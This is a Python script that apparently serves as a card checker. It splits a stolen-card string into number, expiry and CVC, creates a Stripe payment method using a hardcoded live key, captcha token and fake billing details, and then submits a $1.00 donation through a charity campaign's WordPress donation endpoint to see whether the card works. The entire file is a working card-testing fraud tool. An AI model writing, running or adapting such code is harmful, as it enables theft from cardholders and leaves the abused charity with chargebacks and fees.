import time
import requests
from fake_useragent import UserAgent
import random
import re
from bs4 import BeautifulSoup
import base64
import asyncio

def Tele4(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    r = requests.session()
    
    user_agent = UserAgent().random
    
    oa = f'type=card&billing_details[name]=aled&billing_details[email]=deneme1737zs%40gmail.com&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=new+yrok&billing_details[address][line2]=new+ton&billing_details[address][postal_code]=10080&billing_details[address][state]=new+state+1000&billing_details[phone]=%2B1+202-222-3391&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=000069c5-1a77-4113-bf29-b9d067e766a28b47da&muid=52724c8a-e804-4fe7-a225-b33f4c62afb153c055&sid=00d9e83d-462a-486d-8288-ab01b19b5c91e1e200&payment_user_agent=stripe.js%2F1f0095e58d%3B+stripe-js-v3%2F1f0095e58d%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=150277&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiS0puT1dsQ1RWbFN6TWxGbHg5dmJMYmw0ckJxMGVSZEJGVDFQWWZtczduRC8xZTU4aWJSckxGdEFWVFBvRUZKQXhNRUlueTRBNllncG5lVStUbURrSG84VXhzTWRLSkNHU2c1SHpVVmNGeU9nQ1pPMVcwVFpOM0lCdVp3dGNUWG1kUHlKQk51VmIwbnVZU2o4dUhQcTYvVC9WbTBBbDczNGdPNnB3QzFNaVgxNjZFREN5QmZMSlR3WE1WY0hXL282aC9oaWNLYktWM0k1eWlEZjRZTnNGT2dHZm9QTXV3SkFpejhHWDJSdGdRNkJ3dXU0MlBQWUZ2R3dqblhIQzhJRnFjNVkwZE54cVRPWFhXNmtzcHVESXB4aFhjREhGTC9IRU01QlFqd256NmlIWlE2RlUvZE14R2FIdEtkby9GSjJ5K09VMzhFOFNoK0RnZktCRUhGd2lBY2w4V3ozMWgxbmhzZks4N3VIdDZMT3pSaFBCYTJvaURYTXh2b1FYdW4yWHpoZUlablRvb0hBbDd5NS9sRXUyTkErS284R2haei83NytBK2xlc3AwMm5TMk4xYkxFejVxNXRHaVZIMTFpYTF4TmZUK0NIZGU1WERMUmw5Z3BBalN5anVzSTZEWFFxSUExcUoxN3p4QzArQk9tQjh6N2FmcFJ0NHN0VktUZmxYMW9sN2ZBZUtsVlJlN2I3TE5VZkt1cm1QOHJoeW5OZk1UVmE1NzlvTU5NVG1iUXdiWTlxVVBVMVZUdWNlQlluS01VdStJZS9iT0NOWCtYZEVDZlc2ZElaR3JUelJwMmVFZFJiTFlqd0JvNTYwOWNiOWR6WldmU3N6N2c3UG9IcXpwSGlWcS9TbFZCbTluU3doenRmQU01SVowNmRvYnBSNXZIYkJsSjVoRjQvSGNtR2lUMElmc29PRG51YVpUdGxKUlN4V0hxa2tMRklYWWhZRUZJUWRFZk42SjMyZmUrYVBsdVZ0dXovbmgxWWRYWHo3eDVTbWZwYlZoa05FRUxWbUM2a085Nkl0WHpPWEpSUG1EbElGbnUxMG5HOG11T2xVVUo4Tkt1c0hYcnpaYUpQNWhrVEVZRlZoSDVzNS9CV01LQXV4VTNNTmpoYlBvbUxFTGR5ZmUxZmVib1ZBRTg2ZElNMko3NkltRFRuc0dSeTNtUmdybW1pN0locncrRTZoNE1qNzUxcjZyL0haUVRjb1ljTHIwaHM3YjBKMDd1RmIwNEhLbTBOOFNnUFUvVXZ5K2p1QVlCSG4wQUg3RTlEcFJxR05aQzBRekozZWdyT1BCK0EwR1BnMnpMM2RoNGdQOTRRYllHSmdIZVZibVl3REV1amZVZXQzcUpuYjhyTExQOWp0RWhjRE9NRm8zUFhpNlFJTjZtRk05R2R3a2pBSnN3SDlxNVVZb2ExQzVDZHZsdWhEWkdoRHhIVVYwR3ZkdTZkQ0I3NlpETTA2SVdraVNkZzl1YmRKUmtlV0ZoQlJ2VDc4N3dZNFBrZnpqYkNuWHNtNFpTSkdGRWNIVDQzZjgrSWJmOU9hTzh4SjVlU2xvZG9oS3U0WkpEaytWR3NmSjhCczg1TEd3dytGdHFIclRZMnVXRy9GTlBQRGF4ckRGT283bTBORDNJQkhHVlo1aGxka2cyRGM4Nk92MGtvY0ZXRkt1Qk00Y1JhVVJvZ1M2Nzc3T0g2MFY4RDBUdnpYbkhsRVpVUGRHRkE4RjdkaTNjVk1aUXRSMnp2UU9ZQzVQNkU3ZGpnTDZlVjdYTVk0S3VxYVpXQWR5bnBYSWkxcmF2cGwxeGZoc3ZvWExiTlZKRUFQanYxU0RaUk5NZUhDOEZWWmdnc2txbmdqVkdldUZCYkZFWFl6NGJGVTJCSG1ZMlQ2bGhzbkhHZ3BIbTlWdVlNWWltbS9IOFB2eitaUnFwbnFyTXNRWERjWjdQcXBRZHI1NC8zN0lMM3VURGpwRHFmOVorRDcydVZwWTJaRUNBaEVDZlM4Qk1rdDdHNWRIVThsbmEzTlQ5T1o0ekZXVHRWRXI3aGZaV0tXTDIrWlloS2t5UXNzWVE1eFJKcENpMnhQN05kUlRnSEV3SGplUXczZTlEVlhvWm5nNDZOa1ZzYk9tSnVGQXE0RTVpQmU5N1B1V2NvTXF1NXdKQzUzSTBDdnZTNDlwazFtdC8vRGR5QTk1cFZna3FJZFdTd1JOZ1RoYys0VjN1cTl0OGdqQnZiSlJGM0x3dk5PSzhsUWlVUncyTFl5N2FGTktTa2ZlWEp6QkxhK01KRkpWWENROFl0Y1gzY3ptNDhaRUxndjh1WTVuQkd0Z3JpVDBNUnBmcGZ5dThKMml4WDNHVGtIeVVwVGhwcy9WNXBVK0VPSFN5N2NYSW42eXhqYlYyNXVNaFlWbXNzYU04aTRRV3BFVitHdVpFMlBUcXQ0OWRKVDZhUFAyTkp2dVJoeWRKOGoxdjRxK0RyQlpkQ3FDWVhZRnJ2akFFdTRXTm03MjcxZlExQXh4TUh0OWlGcGJHbjUrazFKU1BYWWlpS0JyZm40WlhwVTdhZUhISml6L21oVjh1TzlaTWZ0UGwrMEw0WnZuMzF4V0FOMDZuRHdLSDJsTU1EcjB1bWhTR1BiMUZBcUtTUTJESHV2WnpsRGhzT3hEcDNqQlBhRURQdkk3NlVEQ1VzTWxoc2dhaVB4bHczOU0yMXd5U1Bxci9hOTJBUjBTdGtJYnhQaEREbHh5N1E4ZGE4d2NrYzNSVmdGMDRUUnhLMmprTVlPYW5rY29oL1pKWT0iLCJleHAiOjE3NDMyNjQ5MjYsInNoYXJkX2lkIjozMzk1MTAzMDMsImtyIjoiMzA3ODVjY2YiLCJwZCI6MCwiY2RhdGEiOiJ0M0Rwd2lXbDBidUliMytQUHJtYTBsanBpWkdWVEQ4OEpBaTRVdzk1bmtVWUpGOUtGZEJUSU9weDVkMGJFVVZwMm1ka1AyVTBxNXBzcGpvaEhsZ1BiZUhxS0MyeUs1MGwrbTdzcEY1YU45c1k1QnlEOTc1UnAySWNoTHJSa1A0TlB3MTV0ODA5c1l5a1dwMFl5TFcxMW51MCtteXA4NndwbjQ2d0xsdUpibkZFV0hiYmVpZFptZDdiTHNSUS9lbjl3TThWSDZ1elFuYjdoVUlSIn0.F56uspJdGXkXCNCB-D0PQVGxc2XCzShqe1QUfjgqRu4'

    response = requests.post('https://api.stripe.com/v1/payment_methods', data=oa)
    
    try:
        id = response.json()['id']
    except:
        return response.json()
                              
    kkie = {
    '_ga': 'GA1.1.1600796831.1743264604',
    'charitable_session': '4c2fa697ad33fdc0004e28e60d273953||86400||82800',
    '_ga_M3WG7TPY0P': 'GS1.1.1743264603.1.1.1743264654.0.0.0',
    '__stripe_mid': '52724c8a-e804-4fe7-a225-b33f4c62afb153c055',
    '__stripe_sid': '00d9e83d-462a-486d-8288-ab01b19b5c91e1e200',
    '_ga_9S894YGECP': 'GS1.1.1743264603.1.1.1743264709.0.0.0',
}

    rd = {
    'authority': 'needhelped.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'tr-TR,tr;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://needhelped.com',
    'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user_agent
}

    co = {
    'charitable_form_id': '67e81b8ba8aba',
    '67e81b8ba8aba': '',
    '_charitable_donation_nonce': 'ba3d9330c4',
    '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
    'campaign_id': '1164',
    'description': 'Poor Children Donation Support',
    'ID': '260199',
    'donation_amount': 'custom',
    'custom_donation_amount': '1.00',
    'first_name': 'Anime',
    'last_name': 'Naruto',
    'email': 'deneme1737zs@gmail.com',
    'address': 'new yrok',
    'address_2': 'new ton',
    'city': 'New York',
    'state': 'new state 1000',
    'postcode': '10080',
    'country': 'US',
    'phone': '+1 202-222-3391',
    'gateway': 'stripe',
    'stripe_payment_method': id,
    'action': 'make_donation',
    'form_action': 'make_donation',
}

    responsey = requests.post('https://needhelped.com/wp-admin/admin-ajax.php', cookies=kkie, headers=rd, data=co)
    
    try:
        return responsey.json()
    except:
        return 'errorr'